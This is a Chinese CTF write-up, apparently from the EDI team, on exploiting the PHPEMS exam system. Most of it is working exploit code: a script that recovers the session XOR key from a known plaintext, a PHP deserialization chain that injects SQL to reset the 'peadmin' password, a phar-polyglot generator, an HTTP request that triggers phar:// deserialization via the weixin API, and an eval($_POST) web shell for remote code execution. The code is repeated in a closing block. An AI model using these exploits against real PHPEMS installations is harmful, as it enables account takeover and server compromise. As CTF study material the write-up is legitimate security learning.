# 2024西湖论剑-数据安全-PHPEMS

> 原文: https://www.ctfiot.com/160823.html
> ID: 160823

EDI

JOIN US ▶▶▶

招新

EDI安全的CTF战队经常参与各大CTF比赛，了解CTF赛事。

欢迎各位师傅加入EDI，大家一起打CTF，一起进步。（诚招re crypto pwn 方向的师傅）有意向的师傅请联系邮箱root@edisec.net、shiyi@edisec.net（带上自己的简历，简历内容包括但不限于就读学校、个人ID、擅长技术方向、历史参与比赛成绩等等。

点击蓝字 ·  关注我们

01

反序列化1-unserialize

先定位unserialize，位于lib/strings.cls.php中的decode

从getSessionId 在进入decode,从而触发反序列化。

题目环境也不是这个，所以我们暂时是无法构造的，但是我们可以在本地环境进行测试。以下是服务器提供给我们的encode_strings。

在本地我们已知key进行解密，红色箭头部分则为解密后的序列化数据。

此时我们在来看看encode和decode规则。

每次访问都会给我们发送一个session来标记我们的浏览器，其中分为sessionid、sessionip、sessiontimelimit(此部分为时间戳)其中sessionid是一串md5 生成位置如下。

看sessionip => $this->ev->getClientIp()

可以看到此处的getclientip我们可以通过各种header去控制。

比如XFF、client-ip等在回头看for循环中的$p

于是我们只要找到一个从0开始的到31结束的一个小循环，就可以反推出$key了。再结合之前发现的sessionIP我们可以控制,sessiontimelimit是时间戳。虽然说也能行，但是容易不准利用substr截取。

substr($info,64,32)//即可提取出共同拥有部分// :"sessionip";s:9:"127.0.0.1";s:1

那么接下来就可以写还原key的脚本了。

<?php$info = "%2595%259Cfs%25AF%25D9lon%2586%25D9%25C8%25D7%25D6%25A0%25A1%25A2%25CA%2594X%259D%25AC%259Ccg%259DS%2596i%259B%259B%25C7%2599%2598kp%2595%259Eg%2598%2598%25C7%25CA%259B%259A%2594lid%2593%2592%259B%2594i%25C3fh%2598c%2587p%25AC%259F%259Dn%2584%25A6%259E%25A7%25D9%259B%25A5%25A2%25CD%25D6%2585%259F%25D6qkn%2583ah%2599g%2592%255Ee%2591b%2587p%25AC%259F%2595j%259CU%25AC%2599%25D9%25A5%259F%25A3%25D2%25DA%25CC%25D1%25C8%25A3%259B%25A1%25CA%25A4X%259D%25A2%259Cal%2593g%259Bhk%2595%259Bm%259D%25B0"; //此段直接从目标服务器获取$info = urldecode($info); $info = urldecode($info); $info = substr($info,64,32); //此处提取预测的密文部分function reverse($payload1,$payload2) { $il = strlen($payload1); $key= ""; $kl = 32; for($i = 0; $i < $il; $i++) { $p = $i%$kl; $key .= chr(ord($payload1[$i])-ord($payload2[$p])); } return $key; } echo reverse($info,':"sessionip";s:9:"127.0.0.1";s:1'); // sessionip";s:9:"127.0.0.1";s:1 为我们预测的明文部分?>

session::
__destruct()->pdosql::
makeUpdate->pepdo::
exec中触发数据库查询

完整的exp如下

<?php namespace PHPEMS{ class session{ public function __construct() { $this->sessionid="1111111"; $this->pdosql= new pdosql(); $this->db= new pepdo(); } } class pdosql { private $db ; public function __construct() { $this->tablepre = 'x2_user set userpassword="e10adc3949ba59abbe56e057f20f883e" where username="peadmin";#--'; $this->db=new pepdo(); } } class pepdo { private $linkid = 0; } } namespace { $info = "%2595%259Cfs%25AF%25D9lon%2586%25D9%25C8%25D7%25D6%25A0%25A1%25A2%25CA%2594X%259D%25AC%259Ccg%259DS%2596i%259B%259B%25C7%2599%2598kp%2595%259Eg%2598%2598%25C7%25CA%259B%259A%2594lid%2593%2592%259B%2594i%25C3fh%2598c%2587p%25AC%259F%259Dn%2584%25A6%259E%25A7%25D9%259B%25A5%25A2%25CD%25D6%2585%259F%25D6qkn%2583ah%2599g%2592%255Ee%2591b%2587p%25AC%259F%2595j%259CU%25AC%2599%25D9%25A5%259F%25A3%25D2%25DA%25CC%25D1%25C8%25A3%259B%25A1%25CA%25A4X%259D%25A2%259Cal%2593g%259Bhk%2595%259Bm%259D%25B0"; // 远程环境 $info = "%2592%25A2%25A4%25A0%25F3%25A9%25AE%25A2%259D%2599%25C5%25DD%25E7%25D9%25DF%25D8%25C2%25D9%259DVk%25E9%25A8%259AS%25B3e%258F%258A%25AE%25BFii%2599%25D4%259C%25DAl%25A5%259A%2599%25A8%25B8%25AD%25DA%259E%25A7%2599%2584%25D6%259E%2595d%25DB%25A1%25CBU%25ABt%2580%258C%25BE%2598ok%258A%25E4%25CB%25EB%25A9%25DD%25D8%25D1%25E0%25C2%259A%25AF%25D9%25B0%25A2%258E%2592jfg%25A4%259E%2595Q%25A7t%2580%258C%25BE%2598gg%25A2%2593%25D9%25DD%25A9%25E7%25D2%25D2%25E5%25C6%25E1%25E1%25CB%25E2%25D2%25C1%25D9%25ADVk%25DF%25A8%2598X%25A9y%2594%2589%257D%2594ia%25A3%25EE"; //本地环境 $info = urldecode($info); $info = urldecode($info); $info = substr($info,64,32); function reverse($payload1,$payload2) { $il = strlen($payload1); $key= ""; $kl = 32; for($i = 0; $i < $il; $i++) { $p = $i%$kl; $key .= chr(ord($payload1[$i])-ord($payload2[$p])); } return $key; } define(CS1,reverse($info, ':"sessionip";s:9:"127.0.0.1";s:1')); echo CS1; function encode($info) { $info = serialize($info); $key = CS1; $kl = strlen($key); $il = strlen($info); for($i = 0; $i < $il; $i++) { $p = $i%$kl; $info[$i] = chr(ord($info[$i])+ord($key[$p])); } return urlencode($info); } $session = new PHPEMSsession(); $array = array("sessionid"=>"123123123", $session); echo serialize($array)."n"; echo(urlencode(encode($array)))."n"; }

exec中。虽然说用到了预处理,但是prepare部分我们仍可以控制，那么这个预处理即使在这里也是无效的，并不能防止注入。

使用上面的exp我们就能把后台密码修改为123456，进入后台就能RCE，这个我们下面再写。

02

反序列化2-phar(非预期)

app/weixin/controller/index.api.php中的file_getcontents，

GET /index.php?weixin-api HTTP/1.1Host: phpems.cnPragma: no-cacheCache-Control: no-cacheUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36DNT: 1Accept: */*Referer: http://phpems.cn/Accept-Encoding: gzip, deflate, brCookie: exam_currentuser=Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,vi;q=0.7Connection: closeContent-Length: 179

<xml><ToUserName>123</ToUserName><FromUserName>123</FromUserName><MsgType>image</MsgType><Content>123123</Content>phar:///filepath<FuncFlag>qwe</FuncFlag></xml>

app/document/controller/fineuploader.api.php

<!DOCTYPE html><html lang="en"><head> <meta charset="UTF-8"> <title>Title</title></head><form action="http://exam.cyan.wetolink.com/index.php?document-api-fineuploader" method="post" enctype="multipart/form-data"> <label for="file">文件名：</label> 
 </form></html>

<?php namespace PHPEMS{ class session{ public function __construct() { $this->sessionid="1111111"; $this->pdosql= new pdosql(); $this->db= new pepdo(); } } class pdosql { private $db ; public function __construct() { $this->tablepre = 'x2_user set userpassword="e10adc3949ba59abbe56e057f20f883e" where username="peadmin";#--'; $this->db=new pepdo(); } } class pepdo { private $linkid = 0; } } namespace { $o = new PHPEMSsession(); $filename = '111.phar';// 后缀必须为phar，否则程序无法运行 file_exists($filename) ? unlink($filename) : null; $phar=new Phar($filename); $phar->startBuffering(); $phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>"); $phar->setMetadata($o); $phar->addFromString("foo.txt","bar"); $phar->stopBuffering(); system('copy 111.phar 111.gif'); }
?>

03

后台RCE

<?php namespace t;@eval($_POST[1]);?>

EDI安全

扫二维码｜关注我们

一个专注渗透实战经验分享的公众号


```
substr($info,64,32)//即可提取出共同拥有部分// :"sessionip";s:9:"127.0.0.1";s:1
<?php$info = "%2595%259Cfs%25AF%25D9lon%2586%25D9%25C8%25D7%25D6%25A0%25A1%25A2%25CA%2594X%259D%25AC%259Ccg%259DS%2596i%259B%259B%25C7%2599%2598kp%2595%259Eg%2598%2598%25C7%25CA%259B%259A%2594lid%2593%2592%259B%2594i%25C3fh%2598c%2587p%25AC%259F%259Dn%2584%25A6%259E%25A7%25D9%259B%25A5%25A2%25CD%25D6%2585%259F%25D6qkn%2583ah%2599g%2592%255Ee%2591b%2587p%25AC%259F%2595j%259CU%25AC%2599%25D9%25A5%259F%25A3%25D2%25DA%25CC%25D1%25C8%25A3%259B%25A1%25CA%25A4X%259D%25A2%259Cal%2593g%259Bhk%2595%259Bm%259D%25B0"; //此段直接从目标服务器获取$info = urldecode($info); $info = urldecode($info); $info = substr($info,64,32); //此处提取预测的密文部分function reverse($payload1,$payload2) { $il = strlen($payload1); $key= ""; $kl = 32; for($i = 0; $i < $il; $i++) { $p = $i%$kl; $key .= chr(ord($payload1[$i])-ord($payload2[$p])); } return $key; } echo reverse($info,':"sessionip";s:9:"127.0.0.1";s:1'); // sessionip";s:9:"127.0.0.1";s:1 为我们预测的明文部分?>
session::
__destruct()->pdosql::
makeUpdate->pepdo::
exec中触发数据库查询
<?php namespace PHPEMS{ class session{ public function __construct() { $this->sessionid="1111111"; $this->pdosql= new pdosql(); $this->db= new pepdo(); } } class pdosql { private $db ; public function __construct() { $this->tablepre = 'x2_user set userpassword="e10adc3949ba59abbe56e057f20f883e" where username="peadmin";#--'; $this->db=new pepdo(); } } class pepdo { private $linkid = 0; } } namespace { $info = "%2595%259Cfs%25AF%25D9lon%2586%25D9%25C8%25D7%25D6%25A0%25A1%25A2%25CA%2594X%259D%25AC%259Ccg%259DS%2596i%259B%259B%25C7%2599%2598kp%2595%259Eg%2598%2598%25C7%25CA%259B%259A%2594lid%2593%2592%259B%2594i%25C3fh%2598c%2587p%25AC%259F%259Dn%2584%25A6%259E%25A7%25D9%259B%25A5%25A2%25CD%25D6%2585%259F%25D6qkn%2583ah%2599g%2592%255Ee%2591b%2587p%25AC%259F%2595j%259CU%25AC%2599%25D9%25A5%259F%25A3%25D2%25DA%25CC%25D1%25C8%25A3%259B%25A1%25CA%25A4X%259D%25A2%259Cal%2593g%259Bhk%2595%259Bm%259D%25B0"; // 远程环境 $info = "%2592%25A2%25A4%25A0%25F3%25A9%25AE%25A2%259D%2599%25C5%25DD%25E7%25D9%25DF%25D8%25C2%25D9%259DVk%25E9%25A8%259AS%25B3e%258F%258A%25AE%25BFii%2599%25D4%259C%25DAl%25A5%259A%2599%25A8%25B8%25AD%25DA%259E%25A7%2599%2584%25D6%259E%2595d%25DB%25A1%25CBU%25ABt%2580%258C%25BE%2598ok%258A%25E4%25CB%25EB%25A9%25DD%25D8%25D1%25E0%25C2%259A%25AF%25D9%25B0%25A2%258E%2592jfg%25A4%259E%2595Q%25A7t%2580%258C%25BE%2598gg%25A2%2593%25D9%25DD%25A9%25E7%25D2%25D2%25E5%25C6%25E1%25E1%25CB%25E2%25D2%25C1%25D9%25ADVk%25DF%25A8%2598X%25A9y%2594%2589%257D%2594ia%25A3%25EE"; //本地环境 $info = urldecode($info); $info = urldecode($info); $info = substr($info,64,32); function reverse($payload1,$payload2) { $il = strlen($payload1); $key= ""; $kl = 32; for($i = 0; $i < $il; $i++) { $p = $i%$kl; $key .= chr(ord($payload1[$i])-ord($payload2[$p])); } return $key; } define(CS1,reverse($info, ':"sessionip";s:9:"127.0.0.1";s:1')); echo CS1; function encode($info) { $info = serialize($info); $key = CS1; $kl = strlen($key); $il = strlen($info); for($i = 0; $i < $il; $i++) { $p = $i%$kl; $info[$i] = chr(ord($info[$i])+ord($key[$p])); } return urlencode($info); } $session = new PHPEMSsession(); $array = array("sessionid"=>"123123123", $session); echo serialize($array)."n"; echo(urlencode(encode($array)))."n"; }
app/weixin/controller/index.api.php中的file_getcontents，
GET /index.php?weixin-api HTTP/1.1Host: phpems.cnPragma: no-cacheCache-Control: no-cacheUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36DNT: 1Accept: */*Referer: http://phpems.cn/Accept-Encoding: gzip, deflate, brCookie: exam_currentuser=Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,vi;q=0.7Connection: closeContent-Length: 179

<xml><ToUserName>123</ToUserName><FromUserName>123</FromUserName><MsgType>image</MsgType><Content>123123</Content>phar:///filepath<FuncFlag>qwe</FuncFlag></xml>
app/document/controller/fineuploader.api.php
<!DOCTYPE html><html lang="en"><head> <meta charset="UTF-8"> <title>Title</title></head><form action="http://exam.cyan.wetolink.com/index.php?document-api-fineuploader" method="post" enctype="multipart/form-data"> <label for="file">文件名：</label> 
 </form></html>
<?php namespace PHPEMS{ class session{ public function __construct() { $this->sessionid="1111111"; $this->pdosql= new pdosql(); $this->db= new pepdo(); } } class pdosql { private $db ; public function __construct() { $this->tablepre = 'x2_user set userpassword="e10adc3949ba59abbe56e057f20f883e" where username="peadmin";#--'; $this->db=new pepdo(); } } class pepdo { private $linkid = 0; } } namespace { $o = new PHPEMSsession(); $filename = '111.phar';// 后缀必须为phar，否则程序无法运行 file_exists($filename) ? unlink($filename) : null; $phar=new Phar($filename); $phar->startBuffering(); $phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>"); $phar->setMetadata($o); $phar->addFromString("foo.txt","bar"); $phar->stopBuffering(); system('copy 111.phar 111.gif'); }
?>
<?php namespace t;@eval($_POST[1]);?>
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/02/1-1706860518.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/02/10-1706860519.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/02/2-1706860519.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/02/0-1706860519.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/02/3-1706860520.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/02/0-1706860520.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/02/3-1706860521.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/02/2-1706860522.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/02/9-1706860523.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/02/5-1706860523.png)